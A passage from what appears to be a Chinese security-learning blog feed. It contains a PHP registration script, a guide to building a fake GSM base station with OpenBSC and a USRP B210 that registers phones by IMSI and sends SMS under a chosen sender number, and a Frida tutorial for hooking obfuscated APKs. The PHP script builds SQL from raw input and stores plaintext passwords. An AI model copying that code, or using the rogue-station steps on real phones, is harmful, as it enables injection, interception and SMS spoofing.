class="comment">//echo"选择数据库成功！";</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"sub"</span>]))</span><br><span class="line"></span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">//获取表单数据</span></span><br><span class="line">$username=$_POST[<span class="string">"username"</span>];<span class="comment">//获取姓名</span></span><br><span class="line"></span><br><span class="line">$userage=$_POST[<span class="string">"userage"</span>];<span class="comment">//获取年龄</span></span><br><span class="line"></span><br><span class="line">$usersex=$_POST[<span class="string">"usersex"</span>];<span class="comment">//获取性别</span></span><br><span class="line"></span><br><span class="line">$userid=$_POST[<span class="string">"userid"</span>];<span class="comment">//获取身份信息</span></span><br><span class="line"></span><br><span class="line">        $id=$_POST[<span class="string">"id"</span>];<span class="comment">//获取账号</span></span><br><span class="line"></span><br><span class="line">        $password=$_POST[<span class="string">"password"</span>];<span class="comment">//获取密码</span></span><br><span class="line">        <span class="keyword">if</span>($username==<span class="string">""</span>||$userage==<span class="string">""</span>||$usersex==<span class="string">""</span>||$userid==<span class="string">""</span>||$id==<span class="string">""</span>||$password==<span class="string">""</span>)<span class="comment">//判断是否填写</span></span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"请填写完成！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/register.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;   </span><br><span class="line">          </span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">$regex = <span class="string">"/\/|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\+|\&#123;|\&#125;|\:|\&lt;|\&gt;|\?|\[|\]|\,|\.|\/|\;|\'|\`|\-|\=|\\\|\|/"</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match($regex,$username))</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"姓名不能有特殊字符！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/register.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric($userage)||$userage&gt;<span class="number">150</span>||$userage&lt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"年龄请输入数字且在1-150之间！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"/^\d*$/"</span>,$userid)||strlen($userid)!=<span class="number">18</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"身份信息请输入数字且为18位！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match($regex,$password)||strlen($password)&lt;=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">        &#123;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"密码不能有特殊字符且大于6位！"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/register.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str=<span class="string">"select count(*) from register where id="</span>.<span class="string">"'"</span>.<span class="string">"$id"</span>.<span class="string">"'"</span>;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($str,$link);</span><br><span class="line"></span><br><span class="line">$pass=mysql_fetch_row($result);</span><br><span class="line"></span><br><span class="line">$pa=$pass[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($pa==<span class="number">1</span>)<span class="comment">//判断数据库表中是否已存在该用户名</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.alert"</span>.<span class="string">"("</span>.<span class="string">"\""</span>.<span class="string">"该用户名已被注册"</span>.<span class="string">"\""</span>.<span class="string">")"</span>.<span class="string">";"</span>.<span class="string">"&lt;/script&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span><span class="string">"&lt;script type="</span>.<span class="string">"\""</span>.<span class="string">"text/javascript"</span>.<span class="string">"\""</span>.<span class="string">"&gt;"</span>.<span class="string">"window.location="</span>.<span class="string">"\""</span>.<span class="string">"http://www.shixun.com/register.html"</span>.<span class="string">"\""</span>.<span class="string">"&lt;/script&gt;"</span>;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"username:"</span>.<span class="string">"$username"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"userage:"</span>.<span class="string">"$userage"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"usersex:"</span>.<span class="string">"$usersex"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"userid:"</span>.<span class="string">"$userid"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"id:"</span>.<span class="string">"$id"</span>;</span><br><span class="line"><span class="keyword">echo</span><span class="string">"password:"</span>.<span class="string">"$password"</span>;</span><br><span class="line"></span><br><span class="line">$age=(int)$userage;</span><br><span class="line">$sex=(int)$usersex;</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"insert into register values("</span>.<span class="string">"\""</span>.<span class="string">"$username"</span>.<span class="string">"\""</span>.<span class="string">","</span>.<span class="string">"\""</span>.<span class="string">"$age"</span>.<span class="string">"\""</span>.<span class="string">","</span>.<span class="string">"\""</span>.<span class="string">"$sex"</span>.<span class="string">"\""</span>.<span class="string">","</span>.<span class="string">"\""</span>.<span class="string">"$userid"</span>.<span class="string">"\""</span>.<span class="string">","</span>.<span class="string">"\""</span>.<span class="string">"$id"</span>.<span class="string">"\""</span>.<span class="string">","</span>.<span class="string">"\""</span>.<span class="string">"$password"</span>.<span class="string">"\""</span>.<span class="string">")"</span>;</span><br><span class="line"><span class="comment">//将注册信息插入数据库表中 </span></span><br><span class="line">mysql_query($sql,$link);</span><br><span class="line"> </span><br><span class="line">mysql_query(<span class="string">'SET NAMES UTF8'</span>);</span><br><span class="line"></span><br><span class="line">$close=mysql_close($link);</span><br><span class="line">          </span><br><span class="line"><span class="keyword">if</span>($close)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span><span class="string">"数据库关闭"</span>;</span><br><span class="line">  <span class="keyword">echo</span><span class="string">"注册成功！"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知识点：</p><p>1、php-echo中 . 能连接两个“”字符串，并且echo出js脚本的时候能够执行js。</p><p>2、preg_match（），前一个参数可以是正则表达式，后一个参数是字符串</p><p>3、”//|~|!|@|#|\$|%|^|&amp;|*|(|)|_|+|{|}|:|&lt;|&gt;|?|[|]|,|.|/|;|&#39;|`|-|=|\||/“判断包含特殊字符的正则表达式</p><p>4、”/^\d*$/“判断字符串是否是纯数字的正则表达式</p><p>5、mysql命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create database login；#创建login数据库</span><br><span class="line">use login</span><br><span class="line">create table register(username varchar(20),userage int,usersex int,userid varchar(18),id varchar(20),password varchar(20));#创建register表</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-9-17-伪基站搭建OPENBSC+USRPB210</title>
      <link href="/passages/2019-9-17-%E4%BC%AA%E5%9F%BA%E7%AB%99%E6%90%AD%E5%BB%BAOPENBSC+USRPB210/"/>
      <url>/passages/2019-9-17-%E4%BC%AA%E5%9F%BA%E7%AB%99%E6%90%AD%E5%BB%BAOPENBSC+USRPB210/</url>
      
        <content type="html"><![CDATA[<h1 id="伪基站搭建"><a href="#伪基站搭建" class="headerlink" title="伪基站搭建"></a>伪基站搭建</h1><h2 id="环境和前言"><a href="#环境和前言" class="headerlink" title="环境和前言"></a>环境和前言</h2><p>目前2G基站逐渐消失，本次实验纯粹为了研究，请勿用于非法用途！</p><p>系统环境：VM14+ubuntu16.04.3</p><p>硬件：USRP-B210</p><p>在查找伪基站搭建的资料时，发现了两个项目，OPENBTS和OPENBSC，搭建OPENBTS失败后决定改成搭建OPENBSC环境（OPENBTS最后失败在启动OPENBTS时找不到./transceiver，到相关路径下查看只找到transceiver.o和transceiver.c两个中间文件和源文件，估计是编译时候出错了，找不到相关错误也懒得看makefile文件所以就换成搭建OPENBSC）</p><p>这是OPENBSC的大体架构:</p><p><img src="/images/%E4%BC%AA%E5%9F%BA%E7%AB%99/OPENBSC%E7%BB%93%E6%9E%84%E5%9B%BE.PNG" alt="OPENBSC结构图"></p><p>要想实现最基本的伪基站通信，就需要安装三个组件，OsmoTRX、OsmoBTS、OsmoNITB</p><h2 id="安装OpenBSC"><a href="#安装OpenBSC" class="headerlink" title="安装OpenBSC"></a>安装OpenBSC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mkdir</span> openbsc</span><br><span class="line"><span class="variable">$cd</span> openbsc</span><br><span class="line"><span class="comment">#下载OPENBSC源码</span></span><br><span class="line">$ git <span class="built_in">clone</span> git://git.osmocom.org/openbsc.git</span><br><span class="line"><span class="comment">#安装必要的环境库</span></span><br><span class="line">$ sudo apt install libdbi-dev libdbd-sqlite3 libortp-dev build-essential libtool autoconf autoconf-archive automake git-core pkg-config libtalloc-dev libpcsclite-dev libpcap-dev</span><br><span class="line"><span class="comment">#在安装过程中报错No package 'gnutls' found，本来想下个gnutls，发现特别麻烦，仔细看了下文档，发现ubuntu16.10不用下的libgnutls28-dev和libsctp-dev在16.04可能需要下，所以需要添加两个命令</span></span><br><span class="line">sudo apt-get install libgnutls28-dev</span><br><span class="line">sudo apt-get install libsctp-dev</span><br><span class="line"><span class="comment">#之后按顺序安装libosmocore、libosmo-abis、libosmo-netif、openbsc，openbsc的区别是第二条命令是cd openbsc/openbsc</span></span><br><span class="line"><span class="comment">#以libosmocore为例：</span></span><br><span class="line"><span class="comment">#start---------</span></span><br><span class="line"><span class="variable">$git</span> <span class="built_in">clone</span> git://git.osmocom.org/libosmocore</span><br><span class="line"><span class="variable">$cd</span> libosmocore</span><br><span class="line"><span class="variable">$autoreconf</span> -<span class="keyword">fi</span></span><br><span class="line">$./configure</span><br><span class="line"><span class="variable">$make</span> -j5</span><br><span class="line"><span class="variable">$make</span> check</span><br><span class="line"><span class="variable">$sudo</span> make install</span><br><span class="line"><span class="variable">$sudo</span> ldconfig</span><br><span class="line"><span class="variable">$cd</span> ..</span><br><span class="line"><span class="comment">#end------------</span></span><br><span class="line"><span class="comment">#make install的时候创建出现了cannot create directory ‘/usr/local/include/osmocom’: Permission denied，可以用sudo make install解决</span></span><br><span class="line"><span class="comment">#安装openbsc时在autoreconf -fi步骤可能报错tests/bsc-nat-trie/Makefile.am:9: warning: source file '$(top_srcdir)/src/osmo-bsc_nat/bsc_nat_rewrite_trie.c' is in a subdirectory，不用管</span></span><br></pre></td></tr></table></figure><p>ldconfig这个命令最近安装的时候经常见到，但我却不知道它的意思，这里记录一下：</p><p>为了让动态链接库为系统所共享,还需运行动态链接库的管理命令–ldconfig。ldconfig通常在系统启动时运行,而当用户安装了一个新的动态链接库时,就需要手工运行这个命令.</p><p>详细安装过程可以看<a href="https://osmocom.org/projects/cellular-infrastructure/wiki/Build_from_Source" target="_blank" rel="noopener">https://osmocom.org/projects/cellular-infrastructure/wiki/Build_from_Source</a></p><h2 id="安装-OsmoTRX"><a href="#安装-OsmoTRX" class="headerlink" title="安装 OsmoTRX"></a>安装 OsmoTRX</h2><p>安装步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install --no-install-recommends libusb-1.0-0-dev libboost-dev</span><br><span class="line">$ sudo apt-get install libuhd-dev uhd-host</span><br><span class="line">$ git <span class="built_in">clone</span> git://git.osmocom.org/osmo-trx</span><br><span class="line">$ <span class="built_in">cd</span> osmo-trx</span><br><span class="line">$ autoreconf -i</span><br><span class="line"><span class="comment">#因为我用的usrp，所以使用--with-uhd</span></span><br><span class="line">$ ./configure --with-uhd</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><p>如果是用usrp需要提前安装好UHD，详细安装过程可以看<a href="https://osmocom.org/projects/osmotrx/wiki/OsmoTRX" target="_blank" rel="noopener">https://osmocom.org/projects/osmotrx/wiki/OsmoTRX</a></p><h2 id="安装OsmoBTS"><a href="#安装OsmoBTS" class="headerlink" title="安装OsmoBTS"></a>安装OsmoBTS</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git://git.osmocom.org/osmo-bts.git</span><br><span class="line">$ <span class="built_in">cd</span> osmo-bts</span><br><span class="line">$ autoreconf -i</span><br><span class="line">$ ./configure --<span class="built_in">enable</span>-trx</span><br><span class="line">$ make</span><br><span class="line">$ make check</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure><h2 id="运行openBSC"><a href="#运行openBSC" class="headerlink" title="运行openBSC"></a>运行openBSC</h2><p>安装好所有组件后需要打开四个窗口分别运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo osmo-trx-uhd -C ./osmo-trx/doc/examples/osmo-trx-uhd/osmo-trx-uhd.cfg</span><br><span class="line">$ sudo osmo-nitb -c ./cellular-network-configs/osmocom/openbsc.cfg</span><br><span class="line">$ sudo osmo-bts-trx -c ./cellular-network-configs/osmocom/osmo-bts.cfg</span><br><span class="line">$ sudo telnet localhost 4242</span><br></pre></td></tr></table></figure><p>这里大概解释一下：</p><p>OsmoTRX作为BTS的物理层，主要负责接收SDR传过来的原始信号，然后解析成报文。</p><p>OsmoBTS相当于一个基站控制器，负责与OsmoTRX进行通信，完成基站的各种操作。</p><p>OsmoNITB负责与OsmoBTS通信，用户通过OsmoNITB对基站下达指令。</p><p>不加-c或者-C参数会调用默认配置，但默认配置总是出错（比如默认配置文件找不到，或者运行后不同组件之间无法正常通信），所以我找到github上的<a href="https://github.com/myriadrf" target="_blank" rel="noopener">myriadrf</a>/cellular-network-configs项目</p><p>虽然这个项目是基于limeSDR的，但我认为硬件只会影响到SDR与osmotrx之间的通信接口，所以osmotrx用初始的uhd配置文件，而其它两个用cellular-network-configs项目里的配置文件。</p><p>最后也是成功运行起来。</p><p><img src="/images/%E4%BC%AA%E5%9F%BA%E7%AB%99/OPENBSC%E8%BF%90%E8%A1%8C.PNG" alt="OPENBSC运行"></p><p>如图是四个终端，左上是osmo-trx-uhd，右上是osmo-nitb，右下是osmo-bts-trx，左下是telnet。</p><h2 id="使用openBSC"><a href="#使用openBSC" class="headerlink" title="使用openBSC"></a>使用openBSC</h2><p>四个界面都开启后，手机就能接收到伪基站的信号，比如我将网络选择设为只限2G后成功搜索到01001 2G名称的伪基站信号，当手机连接伪基站后，会显示正在注册，也可能直接就注册失败，但这时候在osmo-nitb终端界面就会看到连接手机的imsi号，比如1234567890123456，这时候在telnet界面输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openBSC&gt; en //记住要先en，有点像交换机，不同模式下能输入的命令不同</span><br><span class="line">openBSC# subscriber imsi 1234567890123456 authorized 1 //使注册者进入网络</span><br><span class="line">openBSC# subscriber imsi 1234567890123456 extension 5555 //设置注册者手机号</span><br></pre></td></tr></table></figure><p>这时候手机就能在基站上注册成功了，同样步骤注册完两个账号后，就可以实现手机间的通信</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openBSC# subscriber imsi 987654321043210 sms sender imsi 1234567890123456 send test123</span><br></pre></td></tr></table></figure><p>这条命令能让987654321043210接收到1234567890123456的短信，短信内容是test123，短信发送人会显示是5555发送过来的。</p><p>具体命令可参考<a href="https://osmocom.org/projects/osmonitb/wiki/OsmoNITB" target="_blank" rel="noopener">https://osmocom.org/projects/osmonitb/wiki/OsmoNITB</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2019-9-11-hook技术的实际使用（面对经过混淆的APK）</title>
      <link href="/passages/2019-9-11-hook%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%EF%BC%88%E9%9D%A2%E5%AF%B9%E7%BB%8F%E8%BF%87%E6%B7%B7%E6%B7%86%E7%9A%84APK%EF%BC%89/"/>
      <url>/passages/2019-9-11-hook%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AE%9E%E9%99%85%E4%BD%BF%E7%94%A8%EF%BC%88%E9%9D%A2%E5%AF%B9%E7%BB%8F%E8%BF%87%E6%B7%B7%E6%B7%86%E7%9A%84APK%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="hook技术的实际使用（面对经过混淆的APK）"><a href="#hook技术的实际使用（面对经过混淆的APK）" class="headerlink" title="hook技术的实际使用（面对经过混淆的APK）"></a>hook技术的实际使用（面对经过混淆的APK）</h1><h2 id="hook获取函数及返回值"><a href="#hook获取函数及返回值" class="headerlink" title="hook获取函数及返回值"></a>hook获取函数及返回值</h2><p>以hook工具frida举例，hook的难点主要在于逆向代码，需要知道APK包名以及所要hook的类，之后就能使用Javause（）来调用这个类。</p><p>frida主要能获取java类中的函数的参数值以及返回值，还有在类中定义的变量</p><p>举一个函数作为例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">d</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">dA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"star hook!"</span>);</span><br><span class="line">        <span class="keyword">var</span> classf = Java.use(<span class="string">"com.a.b.c.d"</span>);<span class="comment">//d是一个class</span></span><br><span class="line">        classf.dA.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">p1,p2</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//dA为d这个class中的函数，p1、p2可以随意命名，只要参数的数量与实际函数符合就行</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"--------------------------------"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"function a hook"</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(p1));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="built_in">JSON</span>.stringify(p2));</span><br><span class="line">            <span class="keyword">var</span> result=classf.dA(p1,p2);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"--------------------------------"</span>);</span><br><span class="line">            <span class="keyword">return</span> result;<span class="comment">//return是为了让手机中的程序正常运行，如果没有return，程序会报错</span></span><br><span class="line">&#125;;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;<span class="comment">//js是弱类型的语言，所以报错信息不需要说明类型，可以直接打印e，打印错误信息是为了方便调试</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"ERROR!"</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>像上面这个js程序，就能够打印出dA这个函数的参数以及返回值了。像这里的com.a.b.c.d就是经过混淆后的包名和类名，在实际hook中，以apk中的包名和类名为准，而不是以源码为准。</p><p>当然还需要一个python程序来调用这个js脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)</span><br><span class="line">os.system(<span class="string">"adb forward tcp:27042 tcp:27042"</span>)</span><br><span class="line">os.system(<span class="string">"adb forward tcp:27043 tcp:27043"</span>)</span><br><span class="line"></span><br><span class="line">output = os.popen(<span class="string">'adb shell ps |grep testapk'</span>)<span class="comment">#taskapk为要hook的apk名字</span></span><br><span class="line">info = output.read()</span><br><span class="line">output.close()</span><br><span class="line">print(info)</span><br><span class="line">pid=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> info.splitlines():</span><br><span class="line">    <span class="keyword">if</span> line.__contains__(<span class="string">"system"</span>):</span><br><span class="line">        item = line.split(<span class="string">" "</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> item[<span class="number">1</span>:]:</span><br><span class="line">            <span class="keyword">if</span>(len(i)&gt;<span class="number">1</span>):</span><br><span class="line">                print(i)</span><br><span class="line">                pid=int(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">rdev = frida.get_remote_device()</span><br><span class="line">session = rdev.attach(pid)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"test.js"</span>) <span class="keyword">as</span> f://test.js是实际hook手机程序的js脚本文件名</span><br><span class="line">    src = f.read()</span><br><span class="line">script = session.create_script(src.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></span><br><span class="line">    print(message)</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">"message"</span>,on_message)</span><br><span class="line">script.load()</span><br></pre></td></tr></table></figure><h2 id="hook的函数没有运行"><a href="#hook的函数没有运行" class="headerlink" title="hook的函数没有运行"></a>hook的函数没有运行</h2><p>在实际hook中，可能hook的是通信过程中的加密或解密函数，像我们这么写的python脚本运行几秒就会结束，在这点时间内如果加密或解密函数没有运行，那就白跑了，什么数据都抓不到。</p><p>第一种方法：</p><p>在python脚本底部增加</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>这样在python脚本等待输入的时候，只要hook的函数有运行到，那就会打印出参数和返回值</p><p>第二种方法：</p><p>用RPC远程调用函数，RPC可以不管目标函数是否有调用，从而强行去调用它</p><p>在js脚本中可以这么写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rpc.exports = &#123;</span><br><span class="line"> </span><br><span class="line">myfunc: <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">        Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//与上文一样</span></span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure><p>在python中可以在 <code>script.load()</code> 之后添加 <code>script.exports.myfunc(a,b)</code>从而调用这个函数</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>frida编写js脚本的时候还有一些需要注意的点，比如java中私有函数和开放函数的时候返回值就不一样，前者是 <code>return this.dA(p1,p2);</code> 后者是<code>return classf.dA(p1,p2);</code></p><p>在类中的变量可以直接用class.value来调用，就跟调用函数一样。</p><p>遗留问题：目前还是不知道怎么打印出函数内的局部变量</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/system/190565.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/190565.html</a> 一篇文章带你领悟Frida的精髓（基于安卓8.1）</p><p><a 